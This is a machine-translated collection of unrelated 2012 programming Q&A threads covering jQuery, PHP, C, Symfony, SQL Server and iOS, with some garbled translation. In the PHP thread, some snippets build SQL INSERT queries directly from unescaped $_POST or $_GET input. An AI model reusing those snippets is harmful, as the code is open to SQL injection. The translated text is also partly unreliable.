我知道这可能是一个菜鸟问题，但我对 JavaScript/jQuery 缺乏经验。

这是我已经尝试过的，但它似乎没有工作......

```
<script type="">
        $(document).ready(function () {
            $("#mac001OEE").val("0%");
        }); 
```

此代码已放置在 HTML 页面的头部。

谢谢 ：）

* * *

## 回答 #1

> 赞同：33
> 
> 时间：2012-05-04T09:50:43.867

请尝试`.text()`在这里阅读：http: [//api.jquery.com/text/](http://api.jquery.com/text/)

**演示** [http://jsfiddle.net/FyVzF/13/](http://jsfiddle.net/FyVzF/13/) **或者**对于您使用 id 的具体示例，请参见此处[http://jsfiddle.net/FyVzF/14/](http://jsfiddle.net/FyVzF/14/)

希望这可以帮助！

**代码**

```
$(document).ready(function() {

    $("p").text('test test Rambo');
}); 
```

**HTML**

```
<p> </p> 
```

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2013-03-06T14:56:22.000

仅对 ID 为“idname”的特定段落尝试此操作：

```
$(document).ready(function() {

    $("p#idname").text('test test Rambo');
}); 
```

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2012-05-04T09:52:23.823

```
$(document).ready(function () {
    $("#mac001OEE").html("0%");

}); 
```

或者

```
$(document).ready(function () {
    $("#mac001OEE").text("0%");

}); 
```

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2016-01-10T13:15:35.373

而不是`.val()`使用`.text()`or `.html()`：

```
$(document).ready(function() {
    $("p").text('saeed');
}); 
```

或者

```
$(document).ready(function() {
    $("p").html('saeed');
}); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-05-04T09:51:01.273

对于非输入元素，您应该使用`html`or`text`方法：

```
$(document).ready(function () {
    $("#mac001OEE").html("0%");
}); 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-05-04T09:51:28.267

假设您正在尝试设置`p`元素的文本，请使用`text()`：

```
$("#mac001OEE").text("0%"); 
```

`val()`用于具有属性的元素，`value`例如和。`input``select``textarea`

# php - 使用 php 将 MS Access 颜色转换为十六进制？

> ID：10446501
> 
> 赞同：0
> 
> 时间：2012-05-04T09:49:15.540
> 
> 标签：php, ms-access

我有一个像“16777215”这样的 MS Access 颜色。这是白色 (#ffffff)。如何使用 php 将此颜色字符串转换为 #ffffff 之类的十六进制？

问候！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-11-20T16:24:33.863

有一个完整的函数可以将 MS Access 颜色值转换为 RGB HEX。感谢 WojtekT 和 poldixd 提供了一些解决此问题的技巧。

```
<?php
function color_msaccess2hex($in) {
    $hex = str_pad(dechex($in), 6, 0, STR_PAD_LEFT);

    // Switch first and third byte
    $hex = mb_substr($hex,4,2).mb_substr($hex,2,2).mb_substr($hex,0,2);

    return '#'.$hex;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-04T09:52:40.853

MS Access 中的颜色值不是以 RGB 模式存储的，而是以 BGR 之类的方式存储的。这意味着将值转换为十六进制后，您需要切换第一个和第三个字节的位置。例子：

访问颜色代码：`5275647`，转换为十六进制为：`507FFF`，切换第一个和第三个字节后得到：`FF7F50`，这就是您的html颜色代码。

这是一个转换表，所以你明白我的意思： [http ://cloford.com/resources/colours/500col.htm](http://cloford.com/resources/colours/500col.htm)

# gwt - GWT 日志记录：将服务器输出发送到客户端

> ID：10446505
> 
> 赞同：0
> 
> 时间：2012-05-04T09:49:24.727
> 
> 标签：gwt, logging, client

我正在使用 GWT 的日志记录机制来显示：

*   客户端浏览器中的客户端日志记录输出（使用 com.google.gwt.logging.client.HasWidgetsLogHandler）
*   服务器日志中的客户端日志记录输出 (com.google.gwt.logging.server.RemoteLoggingServiceImpl)
*   服务器日志中的服务器日志输出（使用 java.util.logging.*）

在客户端调试组件中显示服务器日志是否合理且可能？

您是否建议将服务器日志发送到客户端而不是使用额外的“工具”来访问服务器日志？对于分离的服务器日志记录来说，哪个可以是一个舒适的实现？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-04T10:59:24.340

在服务器端，你可以使用任何你喜欢的工具，显然……在客户端，GWT 提供了你提到的所有这些美妙的选项，包括 RemoteLogger，它可以让你在服务器（这不是您想要在生产中做的事情，但对于调试可能会有所帮助）。

很难理解为什么您需要日志以另一种方式进行，即。从服务器到客户端.....也许您无权访问服务器？但是你将如何处理位于服务器中的 GWT 代码？？？只是没有加起来...如果您有权访问客户端日志记录（无论是托管模式 GWT.log("") 消息、生产模式 java.util.logging 还是远程记录器），并且您拥有服务器日志，您已经掌握了全貌！

在我看来，你的问题的答案：

> 在客户端调试组件中显示服务器日志是否合理且可能？

很简单：

> 不，这不合理。

但是，如果您真的必须这样做，请使用 GWT 的 RPC 机制，它允许您向客户端发送几乎所有内容（当然，在 GWT 限制范围内），包括日志消息......

# cordova - 如何从 Phonegap 读取本地数据库

> ID：10446510
> 
> 赞同：1
> 
> 时间：2012-05-04T09:49:37.050
> 
> 标签：cordova

我创建了一个外部 sqlite 数据库，其中填充了表和数据。现在我想将此数据库与 PhoneGap 应用程序集成。我想从此数据库中获取数据并将其显示在 android 屏幕上。

目前，我必须使用`window.openDatabase(database_name, database_version, database_displayname, database_size);`和`executeSql`函数来输入数据，非常繁琐。我还想知道是否可以将此外部数据库打包在 Phonegap 应用程序（.apk）中

# visual-studio-2010 - 通过 msvsmon.exe 进行 Silverlight 应用程序远程调试

> ID：10446519
> 
> 赞同：0
> 
> 时间：2012-05-04T09:50:11.960
> 
> 标签：visual-studio-2010, silverlight, remote-debugging, silverlight-5.0

我在远程机器上调试 silverlight 应用程序没有什么问题。我启动了 msvsmon.exe，添加了权限，将我的帐户添加到管理员组。但是当我连接时，我无法调试silverlight进程，它的类型被确定为原生（请看[这个截图](http://i.stack.imgur.com/cY6YX.png)）

在本地机器上它工作得很好，我可以附加到任何 Silverlight 进程，我想在远程机器上做同样的事情。另外在远程机器上安装了 XP Service Pack 3 x86，在我的机器上我有 Windows 7 Ultimate x64。我使用 VS 2010，它以管理员身份启动。任何帮助是极大的赞赏。谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-06T13:39:36.540

如果您不在域网络中工作，请查看此处，[http://www.wintellect.com/cs/blogs/jrobbins/archive/2010/06/15/vs-remote-debugging-across-workgroups-or-domains .aspx](http://www.wintellect.com/cs/blogs/jrobbins/archive/2010/06/15/vs-remote-debugging-across-workgroups-or-domains.aspx)

这对我帮助很大。

# html - 画布中的自定义形状？

> ID：10446520
> 
> 赞同：0
> 
> 时间：2012-05-04T09:50:12.823
> 
> 标签：html, canvas

![canas中的自定义形状](../Images/8131d16145539ea8d55e131b8d1fc8f2.png)

有没有办法在 html5 画布中使用“贝塞尔曲线”或“二次曲线”来创建形状。或者有什么方法可以在画布中绘制多边形

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-04T10:49:54.377

对于多边形，您可以使用以下内容（其中 ctx 是画布的 getContext('2d')）：

```
ctx.fillStyle=*hex code of the color you want it to be";
ctx.beginPath();
ctx.moveTo(x1,y1);
ctx.lineTo(x2,y2);
ctx.lineTo(x3,y3);
*add more points if needed using a lineTo(x,y) for each of your points*
ctx.closePath();
ctx.fill(); 
```

如果您想要一个描边多边形，请使用 ctx.strokeStyle 和 ctx.stroke() 而不是 ctx.fillStyle 和 ctx.fill()

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-04T10:00:02.930

当然可以，你至少有：

*   二次曲线到
*   贝塞尔曲线到

看看这个示例代码：

[http://www.html5canvastutorials.com/labs/html5-canvas-playing-card-suits/](http://www.html5canvastutorials.com/labs/html5-canvas-playing-card-suits/)

# php - php/mysql - 我正在做一个有“成就”的网络应用程序（有点像 xbox 成就） - 最好的编程方法是什么？

> ID：10446525
> 
> 赞同：3
> 
> 时间：2012-05-04T09:50:25.647
> 
> 标签：php, mysql, model-view-controller

我将取得成就，例如

获得1000分

登录 20 次

在 24 小时内完成 2 项任务

ETC

对此进行编程的最佳方法是什么？（例如，它背后的逻辑。在每次页面加载时检查每个可能的成就将是浪费资源）

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-04T10:58:43.327

这是一个相当开放的问题。一种方法是将用户已经取得的进度存储在数据库表中（每个成就一列），每次取得进展时，都会增加进度值。当达到目标时，可以为每个成就设置一个魔法值（null、100 万等），然后您只需检查每个用户条目中的哪些列具有魔法值。

您可以只存储进度并计算每次访问的成就状态，但我认为这对于您提到的限时任务之类的事情会有问题，如果您出于任何原因更改目标并且他们失去成就，人们可能会感到厌烦之前已经获得。

可以说更正确的方法是有一个静态的“成就”表，其中每一行都详细说明了一项成就以及目标。然后，您将拥有一个单独的“进度”表，其中每个用户将针对他们正在努力实现的每项不同成就都有一行。这需要更多的工作来实现，但与将目标硬编码到进度表中的列名相比，您可以在以后更轻松地添加/删除/更改目标。我认为你不应该低估这将在以后给你带来的价值。这样，每个用户/成就组合的进度表可以有多个列，这使您可以存储达到的时间等内容，并且您可以非常简单地获得这样的成就列表：

```
SELECT achievement_id
FROM   progress
WHERE  user_id = $user
AND    achievment_time IS NOT NULL 
```

*如果您想在每个页面上显示成就，您*必须检查每个页面加载的内容，但是如果您以其中一种方式记录进度，您就不会回到第一原则并计算已经进行了多少登录，每次完成了多少任务等等 - 只是从您的数据库中选择一个，我认为这就是您的意思。

对于诸如登录次数之类的事情，记录进度很简单（每次执行操作时只需增加一个计数器），但您显然必须更仔细地考虑在时间限制的成就上密切关注进度的逻辑。在这里，您需要跟踪在单独的表中执行操作的时间戳（当然，您可能已经这样做了），并且每次创建新时间戳时，计算前一个时间段内的时间戳，看看是否成就已经达到。

# c - 获取linux中文件的最后修改时间

> ID：10446526
> 
> 赞同：17
> 
> 时间：2012-05-04T09:50:30.447
> 
> 标签：c, linux, timestamp, last-modified

我正在开发一个 C 程序，我需要在其中获取文件的最后修改时间。程序所做的是一个函数循环遍历目录中的每个文件，当找到特定文件时，它会调用另一个函数来检查文件的最后修改时间。

在目录中有一个`mylog.txt.1`，`mylog.txt.2`等等`mylog.txt.3`。当我使用 ll 命令在 linux 中列出该目录时，我可以看到`mylog.txt.1`并`mylog.txt.2`在 5 月 4 日进行了`mylog.txt.3`修改，并在 5 月 3 日进行了修改。

然而，当程序检查每个文件时，它总是返回 3rd may。下面是我正在使用的代码。

```
void getFileCreationTime(char *filePath)
{
    struct stat attrib;
    stat(filePath, &attrib);
    char date[10];
    strftime(date, 10, "%d-%m-%y", gmtime(&(attrib.st_ctime)));
    printf("The file %s was last modified at %s\n", filePath, date);
    date[0] = 0;
} 
```

我已经尝试了 , 的所有不同变体，`st_ctime`但它们都在 3 日返回。`st_mtime``st_atime`

感谢您的任何帮助，您可以提供。

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2012-05-04T10:12:36.027

这对我来说很好：

```
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <sys/stat.h>
#include <sys/types.h>

void getFileCreationTime(char *path) {
    struct stat attr;
    stat(path, &attr);
    printf("Last modified time: %s", ctime(&attr.st_mtime));
} 
```

* * *

## 回答 #2

> 赞同：16
> 
> 时间：2012-05-04T10:01:21.403

这是时区很重要的情况之一。你得到`gmtime`了`st_mtime`. 您应该改为使用`localtime`即。

```
strftime(date, 20, "%d-%m-%y", localtime(&(attrib.st_ctime))); 
```

这是因为`ls`使用了你的时区信息，当你用作`gmtime`显示的一部分时，它故意省略了任何时区信息。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-05-04T10:01:16.680

要解决的问题：

*   使用正确的字段，即`st_ctime`。
*   在使用其结果之前检查是否`stat()`成功。
*   用于`strftime(date, sizeof date, ...`消除使用错误缓冲区大小的风险。

我首先怀疑您的文件系统根本不支持跟踪上次修改时间，但由于您说其他工具设法显示它，我怀疑代码因任何原因而中断。

可能是文件名不是完整的路径名，即它们不包含正确的目录前缀吗？

# php - Symfony 1.4 错误的 URL 路由

> ID：10446527
> 
> 赞同：0
> 
> 时间：2012-05-04T09:50:43.447
> 
> 标签：php, symfony-1.4, url-routing

我定义了一些动作，例如“action = '[module]/[action]'”并提交。结果是 '[currentUrl]/[module]/[action]' 而不是 '[module]/[action]'，我不知道为什么，这是代码：

在前面 ：

```
<a href="<?php echo ( isset($disabledMajSuivi) && $disabledMajSuivi ? "#" : "javascript:showYesNoDialog('". addslashes(__('enquete.visu.msg.confirmation.majsuivi')). "', 'majSuivi')" ); ?>" >
    <?php echo __('enquete.visu.majsuivi');?>
</a> 
```

showYesNoDialog 是一个 javascript 函数，其中第一个 arg 是显示的句子，第二个 arg 是回调函数，因此 'majSuivi' 被回调，如下所示：

```
<script>
function majSuivi(response) {
    if(response == 'yes') {
        document.forms[0].action = "module_name/majsuivi";
        document.forms[0].submit();
    }
} 
```

这个已经调试过了，条件是`true`。

动作“majSuivi”（很大）以这样的方式结束：

```
 $this->redirect('enquete/visu?enq_id='.$enq_id
        . (!is_null($personneMorale) ? '&pm_id='.$personneMorale->getPmId() : '') ); 
```

但是由于错误的 url 没有执行任何操作（所以实际上这部分代码是无用的）。

所以当 URL 应该是：`http://[baseUrl]/index.php/module_name/majsuivi`

而是：在调用 'majSuivi 操作之前，当前 url 在`http://[baseUrl]/index.php/enquete/visu/enq_id/24/menu_id/module_name/majsuivi` 哪里？`/index.php/enquete/visu/enq_id/24/menu_id/`每次单击“a href”按钮时，它都会将“module_name”添加到 URL，如下所示：

点击->`http://[baseUrl]/index.php/enquete/visu/enq_id/24/menu_id/module_name/majsuivi`

点击2->`http://[baseUrl]/index.php/enquete/visu/enq_id/24/menu_id/module_name/module_name/majsuivi`

点击3->`http://[baseUrl]/index.php/enquete/visu/enq_id/24/menu_id/module_name/module_name/module_name/majsuivi`

ETC ...

我不认为它来自 routing.yml 配置文件，但如果有人认为它可以，我会写它的内容。

谢谢你的帮助

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-04T13:34:14.120

你应该使用这样的东西：

```
document.forms[0].action = "<?php echo url_for('module_name/majsuivi')?>"; 
```

或者

```
document.forms[0].action = "/index.php/module_name/majsuivi"; 
```

或者如果您的 routing.yml 中有这条路线

```
document.forms[0].action = "<?php echo url_for('@your_route_name_from_yaml')?>"; 
```

因为`'module_name/majsuivi'`是相对路径，将与您当前的 url 连接而不`/` 在开头

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-21T14:47:45.520

非常感谢，这些都是非常有用的信息，尤其是我认为的第三个选项。实际上，在部署之前我有不同的服务器进行测试。我观察到了两种行为。

**行为 1**：在我测试过的每个解决方案中，只有`document.forms[0].action = "/module_name/majsuivi";`一个有效。

**行为 2**：在我测试过的每个解决方案中，没有一个有效。

我已经研究了从一台测试服务器到另一台不同的 php 版本，但是将两台服务器放在相同的 PHP 和 Apache 版本下并没有使它们在这个问题上有相同的行为。

由于部署环境具有行为 1，我现在通过使用以下 javascript 解决了这个问题：`document.forms[0].action = "/module_name/majsuivi";`.

我之前解释的所有内容都在我的本地服务器上进行，这与行为 1 匹配。

我已经测试了**第一个选项**： document.forms[0].action = ""; 这在任何服务器上都不起作用。

第二**个**给我`http://[baseUrl]/index.php/enquete/visu/enq_id/24/index.php/module_name/majsuivi`，然后它不起作用，我确信如果它在本地服务器上不起作用，它不会在其他服务器上起作用。

我还没有测试**第三个解决方案**，因为我现在解决了我的问题，但它看起来是一个有效的解决方案，我认为它应该可以工作。如果我使用它，我会更新。

感谢和问候

# php - 如果变量不为空，如何仅更新 sql 表列？

> ID：10446530
> 
> 赞同：0
> 
> 时间：2012-05-04T09:50:47.847
> 
> 标签：php, sql

我正在使用 php 从表单字段中获取变量：

```
 $url=$_POST['url'];
    $tags=$_POST['tags'];
    $skillArea=$_POST['skill_area'];
    $description=$_POST['description'];
    $slideshowImageFileName=($_FILES['imageNameSlideshow']['name']); 
```

但是当我运行我的 sql 插入查询时，如果其中一个变量为空，我会得到一个错误，所以我已经编写了 if 语句来处理这个以重写查询字符串，但可以肯定的是，这不是答案吗？看起来很乱

```
if(empty($slideshowImageFileName)){

        $query1="INSERT INTO portfolio (item_name,image_path,description,url) VALUES('$itemName','$imageFileName','$description','$url')"; 

    }else{

        $query1="INSERT INTO portfolio (item_name,image_path,description,url,slideshow_image_path) VALUES('$itemName','$imageFileName','$description','$url','$slideshowImageFileName')"; 
    } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-04T10:01:59.273

我想你正在寻找这样的东西：

```
$slideshowImageFileName = (isset($_FILES['imageNameSlideshow']['name']) && !empty($_FILES['imageNameSlideshow']['name'])) ? $_FILES['imageNameSlideshow']['name'] : NULL; 
```

这将检查幻灯片图像的名称是否已设置且不为空。如果它是 NULL 将分配给变量，如果其正确的值将被分配。

如果要添加空字符串，可以将 NULL 替换为 ""。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-04T09:56:32.413

尝试将 $slideshowImageFileName 的值设置为空字符串或单个空格，因为您的数据库表将接受，并始终使用第二个查询。

```
if(empty($slideshowImageFileName)){
$slideshowImageFileName = "";
}

$query1="INSERT INTO portfolio (item_name,image_path,description,url,slideshow_image_path) VALUES('$itemName','$imageFileName','$description','$url','$slideshowImageFileName')"; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-04T10:03:57.057

有几个选择。

最简单的一个是确保变量始终设置，即使没有通过：

```
//Set up your database connection as normal, check errors etc.
$db = mysqli_connect($host,$user,$password,$db);

$url = isset($_POST['url']) ? mysqli_real_escape_string($db, $_POST['url']) : "";
$tags= isset($_POST['tags']) ? mysqli_real_escape_string($db, $_POST['tags']) : ""; 
```

转义数据是一种很好的做法:) 在您的 INSERT 查询中，您仍然需要将值括在引号中，或者您可以根据您的喜好在上面的代码中执行此操作。

[http://uk3.php.net/manual/en/mysqli.construct.php](http://uk3.php.net/manual/en/mysqli.construct.php)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-04T10:06:15.823

我同意雷先生的看法。但除此之外还有另一种解决方案。可能 table 上的 slideshow_image_path 字段不允许为空。因此，您可以通过允许 null 来更改属性，它会起作用。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-05-04T10:11:30.370

如果我确定我会得到很多可选数据，我可能会构建一个构建器。

像这样：

```
$acceptedKeys = array
  ('item_name', 
   'image_path',
   'description', 
   'url',
   'slideshow_image_path');
$inserts = array();

foreach($_GET as $key => $var) {
  if(in_array($key, $acceptedKeys)) {
    // clean and validate your keys here!
    $inserts[$key] = $var;
  }
}

$customKeys = implode(array_keys($inserts), ',');
$customValues = implode($inserts, ',');

$query = "INSERT INTO portfolio ($customKeys) VALUES($customValues)"; 
```

# iphone - 将导航控制器添加到选项卡式应用程序

> ID：10446532
> 
> 赞同：-1
> 
> 时间：2012-05-04T09:50:53.853
> 
> 标签：iphone, ios, xcode4.2

再会。我尝试将带有导航控制器的新选项卡添加到我的应用程序中。我创建了一个新的选项卡式应用程序（xcode 4.2）并在 appdelegate 中写了这个

```
- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions
{
    self.window = [[[UIWindow alloc] initWithFrame:[[UIScreen mainScreen] bounds]] autorelease];
    // Override point for customization after application launch.
    UIViewController *viewController1 = [[[FirstViewController alloc] initWithNibName:@"FirstViewController" bundle:nil] autorelease];
    UIViewController *viewController2 = [[[SecondViewController alloc] initWithNibName:@"SecondViewController" bundle:nil] autorelease];
    NavController *navController = [[[NavController alloc] initWithNibName:@"NavController" bundle:nil] autorelease]; //my controller
    self.tabBarController = [[[UITabBarController alloc] init] autorelease];
    self.tabBarController.viewControllers = [NSArray arrayWithObjects:viewController1, viewController2, navController, nil];
    self.window.rootViewController = self.tabBarController;
    [self.window makeKeyAndVisible];
    return YES;
} 
```

导航控制器.h 文件

```
@interface NavController : UINavigationController

@end 
```

这里是项目的结构 ![项目结构](../Images/a011aef7e5b0da9a5b89c770c795443a.png)

当我运行项目时，它显示空选项卡 ![结果](../Images/5e52a05a8852829faf1f544eb51fe224.png) 但在 xib 文件中我添加标签和按钮 ![我想要的结果](../Images/143a7bbfc3bf2001f4a4adb988478623.png) 可能是我忘记了什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-04T10:01:57.273

使用一些 UIViewController 初始化您的导航控制器：

```
 RootViewController *rootViewController = [[[RootViewController alloc] initWithNibName:@"RootViewController" bundle:nil] autorelease];
    NavController *navController = [[[NavController alloc] initWithRootViewController: rootViewController] autorelease]; 
```

这可能会有所帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-04T10:05:47.587

我正在与您分享我关于此功能的 APP 代码，希望这可以轻松解决您的问题

在 AppDelegate.m 中添加此代码

```
- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions
{

    self.window = [[[UIWindow alloc] initWithFrame:[[UIScreen mainScreen] bounds]] autorelease];
    self.viewController = [[[ViewController alloc] initWithNibName:@"ViewController" bundle:nil] autorelease];

    UINavigationController *localNavigationController;

    tabBarController = [[UITabBarController alloc] init];

    NSMutableArray *localControllersArray = [[NSMutableArray alloc] initWithCapacity:3];

    viewController = [[[ViewController alloc] initWithNibName:@"ViewController" bundle:nil] autorelease];
    localNavigationController = [[UINavigationController alloc] initWithRootViewController:viewController];
    [localControllersArray addObject:localNavigationController];

    AlaramClock *aAlaramClock = [[[AlaramClock alloc] initWithNibName:@"AlaramClock" bundle:nil] autorelease];
    localNavigationController = [[UINavigationController alloc] initWithRootViewController:aAlaramClock];
    [localControllersArray addObject:localNavigationController];

    CurrentTime *aCurrentTime = [[[CurrentTime alloc] initWithNibName:@"CurrentTime" bundle:nil] autorelease];
    localNavigationController = [[UINavigationController alloc] initWithRootViewController:aCurrentTime];
    [localControllersArray addObject:localNavigationController];

    Settings *aSettings = [[[Settings alloc] initWithNibName:@"Settings" bundle:nil] autorelease];
    localNavigationController = [[UINavigationController alloc] initWithRootViewController:aSettings];
    [localControllersArray addObject:localNavigationController];

    tabBarController.viewControllers = localControllersArray;

    [localControllersArray release];

    // Override point for customization after app launch    
    [window addSubview:tabBarController.view];
    [window makeKeyAndVisible];

    return YES;
} 
```

然后你会得到这个样子

![在此处输入图像描述](../Images/295e7d10fbd4d59c06e9c2251730489c.png)

在每个 ViewController.m 之后

添加这个

```
- (id)initWithNibName:(NSString *)nibNameOrNil bundle:(NSBundle *)nibBundleOrNil 
{
    if (self = [super initWithNibName:nibNameOrNil bundle:nibBundleOrNil]) 
    {
        // Custom initialization
        self.title=@"Calculate Time";
        self.tabBarItem.title = @"Calculate Time";
        self.tabBarItem.image=[UIImage imageNamed:@"time_calculate.png"];
    }

    return self;

} 
```

# c# - 在 SelectedIndexChanged 事件触发后调用 javascript window.onload

> ID：10446533
> 
> 赞同：1
> 
> 时间：2012-05-04T09:51:00.603
> 
> 标签：c#, javascript, asp.net

//我的问题是，当我异步触发 ddlmodalitylist 的 SelectedIndexChanged 事件（ajax 调用）时，不会触发 javascript 加载事件。这就是你必须从服务器端触发 onload 事件。

```
window.onload = body_Onload;

     function body_Onload() {
        //javascript code
       }

    protected void ddlModalityList_SelectedIndexChanged(object sender, EventArgs e)
        {
            ddlStudy.Items.Clear();
            ListItem selectedPair = ddlModalityList.SelectedItem;
            string str= selectedPair.Value;

           int ID= Convert.ToInt32(str);

           if (ID == -1)
           {
              // ddlStudy.Items.Clear();
               return;
           }

            DataTable dataTableStudy = null;
            dataTableStudy = objSqlDbComm.ExecuteDatasetQuery(strSQL).Tables[0];

            var dictioneryStudy = new Dictionary<int, string>();
            foreach (DataRow dr in dataTableStudy.Rows)
            {          

                dictioneryStudy.Add(Convert.ToInt32(dr["Study_ID"]), dr["Study_Desc"].ToString());
            }

            ddlStudy.DataTextField = "Value";
            ddlStudy.DataValueField = "Key";
            ddlStudy.DataSource = dictioneryStudy;
            ddlStudy.DataBind();
            ddlStudy.Items.Insert(0, new ListItem("[Select]", "-1"));
            ddlStudy.Items[0].Selected = true;

        } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-24T06:19:45.437

```
Sys.Application.add_init(your_bodyload_function); 
```

# javascript - 正确的方法：总是将所有变量作为函数参数传递？

> ID：10446536
> 
> 赞同：0
> 
> 时间：2012-05-04T09:51:04.493
> 
> 标签：javascript, oop, function

我正在考虑**正确的编程方法：**

在编写 JavaScript 代码时，我从函数和对象中引用了许多动态创建的全局对象和变量，尽管**我没有将它们作为函数参数传递**。这样，我失去了函数的多功能性和独立性，因为函数和对象依赖于我的应用程序中的另一个全局对象。我知道这个事实，但是，我的对象/函数通常需要许多变量才能使用。

您是否建议我是否应该始终努力将所有变量和对象作为函数参数传递？这样就可以清楚地知道函数需要哪些变量，如果我提供正确的参数，函数将始终有效

或者，我不需要那么严格，只要我的函数/对象工作，尽管它们引用全局对象，我不需要再为这个问题烦恼吗？

我需要知道正确的编程方法，所以我不会习惯错误的事情。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-05T02:51:22.977

是的，您想尽可能少地使用全局变量。如果结果你发现你向每个函数传递了很多参数，那么你应该查看这些参数并询问它们有什么共同点。很多时候，添加额外的对象会有所帮助。您可以将参数组合到对象的实例变量中并传递一个对象。然后，您无需提取实例变量，而是将操作委托给该对象。

例如，假设您有以下代码：

```
 drawLine(fromX, fromY, toX, toY, thickness, color, canvas) 
```

您可以创建一个点来保存 x,y 值和一个图形上下文来保存厚度、颜色和画布。结果调用变为：

```
 drawLine(from, to, context) 
```

您减少了参数的数量并创建了包含常用操作的可重用对象。

# sql - 删除具有相同字段值的连续行

> ID：10446546
> 
> 赞同：4
> 
> 时间：2012-05-04T09:51:45.360
> 
> 标签：sql, sql-server, sql-server-2008, tsql

我是 SQL Server 2008 的初学者，我很难找到以下问题的解决方案：

我想做一个 SELECT 来消除具有相同“stat”的连续行并只保留最后一次出现。

为了让自己更好地理解，我给你这个例子：

```
My table                                                 Results 
idLigne | id | statut                                    idLigne | id | stat  
   L1     1      A                                          L2     1      A
   L2     1      A                                          L6     1      B
   L3     1      B                                          L7     1      A
   L4     1      B                    ====>                 L8     1      B
   L5     1      B
   L6     1      B
   L7     1      A
   L8     1      B 
```

谢谢你。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-04T10:15:07.650

如果您将行号分配给结果集，您可能会在行号和行号上连接“当前”和“上一个”记录 - 1；如果 statut 不是来自 t2 的同一行，则将被取消。对此进行测试将为我们提供没有前任的行。

```
; with transformed as (
  select idLigne, 
         statut, 
         row_number () over (order by idLigne) rn
    from myTable
)
select myTable.*
  from myTable
 inner join transformed t1
    on myTable.idLigne = t1.idLigne
  left join transformed t2
    on t1.rn = t2.rn - 1
   and t1.statut = t2.statut
 where t2.rn is null 
```

演示在[Sql Fiddle](http://sqlfiddle.com/#!3/d894c/1)。

# php - 在同一 div 中的 div 内打开链接

> ID：10446547
> 
> 赞同：2
> 
> 时间：2012-05-04T09:51:48.593
> 
> 标签：php, javascript, html, navigation

我正在尝试在`div`其中包含 PHP 网页，但是当我单击其中的任何链接时`div`，它会在新窗口中加载。

有谁知道如何解决这个问题？

我也尝试使用 a`iframe`而不是 a`div`但它导致了其他问题。

HTML 代码：

```
<div id="cover5">
    <div id="warning">
        <?php include 'SignIn.php'; ?>
        <p align="center">
            <a href="#" onclick="javascript:cover5();">Home</a>
        </p>
    </div>
</div> 
```

JS代码：

```
function cover5() {
    var cover = document.getElementById('cover5');
    if (vis) {
        vis = 0;
        cover.style.display='block';
    }
    else {
        vis = 1;
        cover.style.display='none';
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-04T10:06:34.997

您必须区分 Web 应用程序的客户端和服务器端。

`<?php include 'SignIn.php'; ?>`是一个服务器端命令，因为`<?php ?>`，这意味着用户将永远不会准确地看到该行。

`SignIn.php`例如，如果您的文件包含`<a href="go-there.php">my link</a>`，则用户将仅获得该包含的输出，即

```
<div id="warning">
    <a href="go-there.php">my link</a
</div> 
```

当用户点击链接时，他的浏览器会加载它，就好像它是`<a />`直接*写*在你的 HTML 代码中一样，然后在新窗口中打开它。

我不知道如何使用原生 JS，但是使用 jQuery，你可以尝试这样的事情：

```
$(function() {
    $("#warning a").each(function() {
        $("#warning").load($(this).attr("href"));
    });
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-04T10:02:50.767

要从页面元素内的特定链接呈现 html，您需要运行`ajax` `GET`调用并加载 html。然后将响应插入到您的`div`.

使用 jQuery：

```
$("a").click(function(){                    //calls function when anchor is clicked
  var link = $(this).prop("src");           //finds the link from the anchor
  $.get(link,function(data, status, xhr){   //makes an ajax call to the page
    $("#myDiv").html(data);                 //replaces the html of #myDiv with the returned page
  });
}); 
```

希望有帮助

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-04T11:20:01.003

HTML 代码：

```
<div id="cover5">
    <div id="links">
        <p align="center">
            <a href="#" onclick="javascript:cover5();">Home</a>
        </p>
    </div>
    <div id="warning">
        <?php include 'SignIn.php'; ?>
    </div>
</div> 
```

和JS代码：

```
function cover5() {
    var cover = document.getElementById('warning');
    if (vis) {
        vis = 0;
        cover.style.display='block';
    }
    else {
        vis = 1;
        cover.style.display='none';
    }
} 
```

每当用户单击“链接” div 中的链接时，它将调用 JS 函数“ **cover5()** ”

您可以使用 jQuery 或 ajax 弹出“警告”div

在您的代码中，您将链接添加到**佩戴**的div 以便在第二次时 ti 将隐藏那里的所有链接形式。

# asp.net - xml 标记都在一行上

> ID：10446548
> 
> 赞同：0
> 
> 时间：2012-05-04T09:51:49.313
> 
> 标签：asp.net

我在asp中创建了一个sitemap.xml，我想将这个xml作为输出（示例）

```
<?xml version="1.0" encoding="UTF-8"?>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
<url>
<loc>11111</loc>
